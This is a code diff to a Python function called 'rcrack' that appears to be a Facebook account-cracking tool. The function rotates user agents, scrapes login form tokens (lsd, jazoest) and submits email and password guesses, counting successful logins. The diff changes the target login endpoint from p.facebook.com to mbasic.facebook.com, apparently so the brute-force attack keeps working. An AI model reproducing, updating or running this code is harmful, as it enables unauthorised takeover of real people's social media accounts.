@@ -218,7 +218,7 @@ def rcrack(uid,pwx,tl):
 			sys.stdout.write('\r[%s/%s]OK:-%s'%(loop,tl,len(oks))),
 			sys.stdout.flush()
 			pro = random.choice(agents)
-			free_fb = session.get('https://p.facebook.com/?_rdc=2&_rdr&tbua=1').text
+			free_fb = session.get('https://mbasic.facebook.com/home.php?paipv=0&eav=AfYgD9BcuI9Parp8KxUrcnd2Oepvq0IEkNj3lL7MstMK0eAuga_M8cPYp4xhTUAo-ww&tbua=1').text
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -229,9 +229,9 @@ def rcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority':"p.facebook.com",
+			header_freefb = {'authority':"mbasic.facebook.com",
 			'method':'GET',
-			'path':'/?_rdc=2&_rdr&tbua=1',
+			'path':'/home.php?paipv=0&eav=AfYgD9BcuI9Parp8KxUrcnd2Oepvq0IEkNj3lL7MstMK0eAuga_M8cPYp4xhTUAo-ww&tbua=1',
 			'scheme':'https',
 			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
 			'accept-encoding': 'gzip, deflate, br',
